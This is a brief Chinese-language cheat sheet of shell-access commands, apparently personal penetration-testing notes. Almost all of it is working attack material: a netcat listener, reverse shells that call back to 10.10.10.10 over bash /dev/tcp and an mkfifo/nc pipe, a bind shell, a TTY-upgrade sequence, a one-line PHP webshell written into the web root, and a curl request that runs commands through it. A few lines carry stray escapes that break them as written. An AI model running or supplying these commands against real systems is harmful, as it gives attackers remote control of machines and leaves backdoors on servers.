# Shell 使用小记

-  启动监听

```
    nc -lvnp 2348
```

-  从远程服务器发送反弹 Shell

```
    bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

-  从远程服务器发送另一个反弹 Shell

```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f
```

-  在远程服务器上启动绑定 Shell

```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i2>&1\|nc -lvnp 1234 >/tmp/f
```

-  连接到在远程服务器上启动的绑定 Shell

```
    nc 10.10.10.10 1234
```

-  升级 Shell 环境

```
    python -c 'import pty; pty.spawn("/bin/bash")'
    
    ctrl+z
    stty raw -echo
    fg
    连续按enter两次
```

-  创建一个 webshell php 文件

```
    echo "<?php system(\$_GET['cmd']);?>" >/var/www/html/shell.php
```

-  在上传的 webshell 上执行命令
- 
```
    curl http://SERVER_IP:PORT/shell.php?cmd=id
```